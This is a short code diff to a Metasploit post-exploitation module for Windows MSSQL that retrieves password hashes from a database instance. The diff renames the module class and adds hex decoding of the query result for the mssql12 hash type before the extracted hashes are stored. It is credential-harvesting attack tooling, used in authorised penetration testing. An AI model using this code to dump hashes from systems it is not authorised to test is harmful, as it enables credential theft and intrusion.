@@ -9,7 +9,7 @@ require 'msf/core/auxiliary/report'
 require 'msf/core/post/windows/mssql'
 
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::MSSQL
 
@@ -112,11 +112,16 @@ class Metasploit3 < Msf::Post
 
     print_status("Attempting to get password hashes...")
 
-    get_hash_result = run_sql(query, instance_name)
+    res = run_sql(query, instance_name)
 
-    if get_hash_result.include?('0x')
+    if res.include?('0x')
       # Parse Data
-      hash_array = get_hash_result.split("\r\n").grep(/0x/)
+      if hash_type == "mssql12"
+        res = res.unpack('H*')[0].gsub("200d0a", "_CRLF_").gsub("0d0a", "").gsub("_CRLF_", "0d0a").gsub(/../) {
+          |pair| pair.hex.chr
+        }
+      end
+      hash_array = res.split("\r\n").grep(/0x/)
 
       store_hashes(hash_array, hash_type)
     else
